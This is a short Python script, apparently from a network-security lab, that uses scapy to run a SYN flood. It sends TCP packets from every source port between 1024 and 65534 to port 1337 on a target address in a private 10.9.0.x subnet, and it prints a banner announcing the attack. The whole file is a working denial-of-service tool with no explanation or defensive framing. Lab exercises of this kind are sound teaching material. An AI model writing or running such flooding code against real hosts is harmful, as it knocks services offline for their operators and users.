#!/bin/env python3
from scapy.all import *

print("SYN Flooding Attack started from attacker to victim server.........")

def synFloodAttack(source, target):
   for sport in range(1024, 65535):
      ip = IP(src=source, dst=target)
      tcp = TCP(sport=sport, dport=1337)
      pkt = ip/tcp
      send(pkt)

source = "10.9.0.20"
target = "10.9.0.21"
synFloodAttack(source, target)
